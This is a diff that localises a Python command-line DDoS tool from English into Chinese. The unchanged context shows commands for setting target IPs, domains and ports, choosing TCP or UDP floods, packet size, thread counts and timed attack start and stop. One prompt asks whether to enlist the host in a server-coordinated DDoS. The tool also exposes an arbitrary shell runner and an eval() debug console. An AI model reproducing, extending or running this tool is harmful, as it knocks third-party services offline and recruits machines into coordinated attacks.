@@ -70,33 +70,33 @@ class Main:
 		event.commands(self.show_values, ["values", "ls"])
 
 		event.help_comment("|\n|-- Main commands:")
-		event.help("port", "Set the target's port.")
-		event.help("threads", "Set the number of threads.")
-		event.help("ip", "Set the target's IP.")
-		event.help("web", "Target the ip of a domain.")
-		event.help("method", "Change attack method between UPD, TCP.")
-		event.help("sleep", "Set the time delay between each packet send.")
-		event.help("outtxt", "Output each packets send status: enable/disable.")
-		event.help("mute", "Do not output the connection reply.")
-		event.help(["values", "ls"], "Show all selected options.")
-		event.help("run", "Start the attack.")
+		event.help("port", "设置目标端口。")
+		event.help("threads", "设置线程数。")
+		event.help("ip", "设置目标 IP。")
+		event.help("web", "设置域名对应的 IP。")
+		event.help("method", "在 UDP 和 TCP 之间切换攻击方法。")
+		event.help("sleep", "设置每个数据包发送之间的时间延迟。")
+		event.help("outtxt", "输出每个数据包发送状态：启用/禁用。")
+		event.help("mute", "不输出连接回复。")
+		event.help(["values", "ls"], "显示所有已选择的选项。")
+		event.help("run", "开始攻击。")
 		event.help_comment("|\n|-- Set Send-text:")
-		event.help("message", "Set the packt's message.")
-		event.help("repeat", "Repeat the target's message specific times.")
-		event.help("mb", "Send specified amount of MB packtes to server.")
-		event.help("get", "Define the GET Header.")
-		event.help("agent", "Define a user agent instead of a random ones.")
+		event.help("message", "设置数据包消息。")
+		event.help("repeat", "重复目标消息指定次数。")
+		event.help("mb", "向服务器发送指定大小的 MB 数据包。")
+		event.help("get", "定义 GET Header。")
+		event.help("agent", "定义一个用户代理，代替随机代理。")
 		event.help_comment("|\n|-- Stress Testing:")
-		event.help("stress", "Enable the Stress-testing mode.")
-		event.help("st wait", "Set the time between each stress level.")
+		event.help("stress", "启用压力测试模式。")
+		event.help("st wait", "设置每个压力级别之间的时间。")
 		event.help_comment("|\n|-- Multiple:")
-		event.help("ips", "Set multple ips to target.")
-		event.help("webs", "Set multple domains to target.")
-		event.help("ports", "Attack multiple ports.")
+		event.help("ips", "设置多个目标 IP。")
+		event.help("webs", "设置多个目标域。")
+		event.help("ports", "攻击多个端口。")
 		event.help_comment("|\n|-- Automation:")
-		event.help("auto start", "Set the delay before the attack should start.")
-		event.help("auto step", "Set the delay between the next thread to activate.")
-		event.help("auto stop", "Set the delay after the attack should stop.")
+		event.help("auto start", "设置攻击开始前的延迟。")
+		event.help("auto step", "设置下一线程激活之间的延迟。")
+		event.help("auto stop", "设置攻击停止后的延迟。")
 
 	def banner(self):
 		system("clear || cls")
@@ -113,17 +113,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		self.help()
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("祝您愉快。")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("输入 shell 命令：", ". ", command))
 		print("")
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("输入调试命令：", "$ ", command))
 		print("")
 
 	@event.command
@@ -137,7 +137,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("您输入的命令不存在。")
 		print("")
 
 	def check_session(self):
@@ -178,14 +178,14 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("向服务器发送命令时发生错误。")
 				print("")
 
 	@event.command
 	def debug():
 		var.l4_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("调试模式已启用。")
 		print("")
 
 	def help(self):
@@ -197,7 +197,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def port(command):
 		print("")
 		try:
-			var.port = [int(tools.arg("Port: ", "port ", command))]
+			var.port = [int(tools.arg("端口：", "port ", command))]
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print("")
@@ -206,7 +206,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def threads(command):
 		print("")
 		try:
-			var.threads = int(tools.arg("Threads: ", "threads ", command))
+			var.threads = int(tools.arg("线程：", "threads ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print("")
@@ -214,16 +214,16 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def ip(command):
 		print("")
-		var.ip = [tools.arg("Target: ", "ip ", command)]
+		var.ip = [tools.arg("目标：", "ip ", command)]
 		if "." not in var.ip[0]:
-			print("This IP does not exist.")
+			print("该 IP 不存在。")
 		print("")
 
 	@event.command
 	def web(command):
 		print(" ")
 		try:
-			webtoip = tools.arg("Website: ", "web ", command)
+			webtoip = tools.arg("网站：", "web ", command)
 			webtoip = webtoip.replace("http://", "")
 			webtoip = webtoip.replace("https://", "")
 			webtoiptxt = str(socket.gethostbyname(webtoip))
@@ -237,17 +237,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print("")
 		if var.socketmethod == "TCP":
 			var.socketmethod = "UDP"
-			print("Method changed to UDP.")
+			print("方法已切换为 UDP。")
 		else:
 			var.socketmethod = "TCP"
-			print("Method changed to TCP.")
+			print("方法已切换为 TCP。")
 		print("")
 
 	@event.command
 	def sleep(command):
 		print("")
 		try:
-			var.sleep = int(tools.arg("Delay in seconds: ", "sleep ", command))
+			var.sleep = int(tools.arg("延迟（秒）：", "sleep ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print("")
@@ -256,10 +256,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def outtxt(command):
 		print(" ")
 		if var.outtxt:
-			print("The output has been reduced.")
+			print("输出已减少。")
 			var.outtxt = False
 		else:
-			print("The output has been set to normal.")
+			print("输出已恢复正常。")
 			var.outtxt = True
 		print(" ")
 
@@ -267,24 +267,24 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def mute(command):
 		print(" ")
 		if var.outtxtmute:
-			print("The output has been disabled.")
+			print("输出已禁用。")
 			var.outtxtmute = False
 		else:
-			print("The output has been enabled.")
+			print("输出已启用。")
 			var.outtxtmute = True
 		print(" ")
 
 	@event.command
 	def message(command):
 		print("")
-		var.message = tools.arg("Message: ", "message ", command)
+		var.message = tools.arg("消息：", "message ", command)
 		var.rtxt = 1
 		print("")
 
 	@event.command
 	def get(command):
 		print("")
-		var.get_url = tools.arg("GET Header: ", "get ", command)
+		var.get_url = tools.arg("GET Header：", "get ", command)
 		print("")
 
 	@event.command
@@ -292,7 +292,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print(" ")
 		try:
 			rtxtzw = var.rtxt
-			var.rtxt = int(tools.arg("Repeat message x times: ", "repeat ", command))
+			var.rtxt = int(tools.arg("重复消息次数：", "repeat ", command))
 			if var.rtxt < 1:
 				print("There was an error while executing.")
 			else:
@@ -309,7 +309,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def mb(command):
 		print(" ")
 		try:
-			setmb = int(tools.arg("Size of Packet in MB: ", "mb ", command))
+			setmb = int(tools.arg("数据包大小（MB）：", "mb ", command))
 			setmb = int(setmb / 0.000001)
 			var.message = ("r" * setmb)
 			var.rtxt = setmb
@@ -322,10 +322,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def stress(command):
 		print(" ")
 		if var.stress:
-			print("The stress mode has been disabled.")
+			print("压力测试模式已禁用。")
 			var.stress = False
 		else:
-			print("The stress mode has been enabled.")
+			print("压力测试模式已启用。")
 			var.stress = True
 		print(" ")
 
@@ -333,7 +333,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def st_wait(command):
 		print("")
 		try:
-			var.timeforstress = int(tools.arg("Delay in seconds: ", "st wait ", command))
+			var.timeforstress = int(tools.arg("延迟（秒）：", "st wait ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print("")
@@ -341,17 +341,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def ips(command):
 		print("")
-		var.ip = tools.arg("Targets (Seperated by ', '): ", "ips ", command).split(", ")
+		var.ip = tools.arg("目标（用 ', ' 分隔）：", "ips ", command).split(", ")
 		for ip in var.target:
 			if "." not in ip:
-				print("This IP does not exist.")
+				print("该 IP 不存在。")
 		print("")
 
 	@event.command
 	def ports(command):
 		print("")
 		try:
-			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
+			var.port = tools.arg("端口（用 ', ' 分隔）：", "ports ", command).split(", ")
 			for port in var.port:
 				if isinstance(port, int):
 					print("Entered ports cannot be used.")
@@ -363,7 +363,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def webs(command):
 		print(" ")
 		try:
-			webtoip = tools.arg("Websites (Seperated by ', '): ", "webs ", command).split(", ")
+			webtoip = tools.arg("网站（用 ', ' 分隔）：", "webs ", command).split(", ")
 			for pos, web in enumerate(webtoip):
 				webtoip[pos] = web.replace("http://", "")
 				webtoip[pos] = webtoip[pos].replace("https://", "")
@@ -377,7 +377,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_step(command):
 		print(" ")
 		try:
-			var.autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
+			var.autostep = int(tools.arg("下一线程激活延迟（秒）：", "auto step ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -386,7 +386,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_start(command):
 		print(" ")
 		try:
-			var.autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
+			var.autostart = int(tools.arg("攻击开始延迟（秒）：", "auto start ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -395,7 +395,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_stop(command):
 		print(" ")
 		try:
-			var.autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
+			var.autostop = int(tools.arg("在 x 秒后停止攻击：", "auto stop ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -403,29 +403,29 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def agent(command):
 		print(" ")
-		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
+		var.user_agents = [tools.arg("输入用户代理：", "agent ", command)]
 		print(" ")
 
 	def show_values(self):
 		print("")
 		print("Ports: %s" % var.port)
-		print("Threads: %s" % var.threads)
+		print("线程：%s" % var.threads)
 		print("Targets: %s" % var.ip)
 		print("Method: %s" % var.socketmethod)
 		print("Time between each packet: %s" % var.sleep)
 		print("Output: %s" % var.outtxt)
 		print("Muted: %s" % var.outtxtmute)
-		print("Packet message: %s" % var.message[:15])
+		print("数据包消息：%s" % var.message[:15])
 		print("Repeat packet text: %s" % var.rtxt)
 		print("Stress-Test mode: %s" % var.stress)
 		print("Stress-Test level duration: %s" % var.timeforstress)
 		print("Start Delay: %s" % var.autostart)
 		print("Stop after x seconds: %s" % var.autostop)
-		print("Time between threads: %s" % var.autostep)
+		print("线程间时间：%s" % var.autostep)
 		if len(var.user_agents) == 1:
 			print("User Agent: %s" % var.user_agents[0])
 		if var.get_url != "":
-			print("GET Header: %s" % var.get_url)
+			print("GET Header：%s" % var.get_url)
 		print("")
 
 	def stresstest(self):
@@ -483,13 +483,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						if var.outtxt:
 							if not mesalready:
 								mesalready = True
-								print("\nSuccess for %s with port %s!" % (ipvalue, portvalue))
+								print("\n%s 端口 %s 请求成功！" % (ipvalue, portvalue))
 						# sleep(sleepy)
 						var.command_log.append("Sucessful execution.")
 					except socket.error as ex:
 						if not var.outtxtmute:
 							mesalready = False
-							print("\nTarget %s with port %s not accepting request!" % (ipvalue, portvalue))
+							print("\n%s 端口 %s 未接受请求！" % (ipvalue, portvalue))
 						var.command_log.append("ERROR: %s" % ex)
 						if var.l4_debug:
 							print("ERROR: %s" % ex)
@@ -505,7 +505,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				autoendtime = time()
 				autotimer = (int(autoendtime) - int(var.autostarttime))
 				if var.autostop <= autotimer:
-					print("\x1b[0;39mAuto Stop")
+					print("\x1b[0;39m自动停止")
 					var.runactive = False
 					quit()
 		var.stoped_threads += 1
@@ -516,14 +516,14 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		if var.ip != "":
 			def execute():
 				print("")
-				print("To stop the attack press: ENTER or CRTL + C")
+				print("停止攻击请按：ENTER 或 CTRL + C")
 				sleep(3)
 				sleep(var.autostart)
 				if var.stress:
 					if len(var.target) == 1 and len(var.port) == 1:
 						self.stresstest()
 					else:
-						print("Do not use multiple targets/ports in the Stress-Testing mode.")
+						print("在压力测试模式下请不要使用多个目标/端口。")
 				else:  # Normal Mode
 					if var.autostop != 0:
 						var.autostarttime = time()
@@ -533,10 +533,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							sleep(var.autostep)
 							t.start()
 						except Exception:
-							print("Could not start thread %s." % thread)
+							print("无法启动线程 %s。" % thread)
 
 				def reset_attack():
-					print("Stopping threads...")
+					print("正在停止线程...")
 					var.runactive = False
 					sleep(2)
 					while True:
@@ -546,7 +546,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							sleep(1)
 
 					if var.l4_debug:
-						print("Saving debugging log...")
+						print("正在保存调试日志...")
 						output_to = path.join(getcwd(), "l4_debug_log.txt")
 
 						write_method = "a"
@@ -562,7 +562,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						output_file.write(str(version + "\n"))
 						output_file.write(str("\n".join(var.command_log)))
 						output_file.close()
-					print("Done.")
+					print("完成。")
 					quit()
 
 				def check_stopped_execution():
@@ -596,12 +596,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						break
 					else:
 						sleep(1)
-			elif not tools.question("\nDo you agree to the terms of use?"):
-				print("Agreement not accepted.")
+			elif not tools.question("\n您是否同意使用条款？"):
+				print("未接受协议。")
 				quit()
 			else:
 				if var.server[0] and var.server[1]:
-					if tools.question("\nWould you like to use the host as part of the ddos?"):
+					if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
 						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 						if status != "200":
 							print("An error occured, while sending data to the server.")
@@ -611,7 +611,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						if status != "200":
 							print("An error occured, while sending data to the server.")
 						try:
-							print("[Press Enter to stop the attack.]")
+							print("[按回车停止攻击。]")
 						except KeyboardInterrupt:
 							pass
 						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
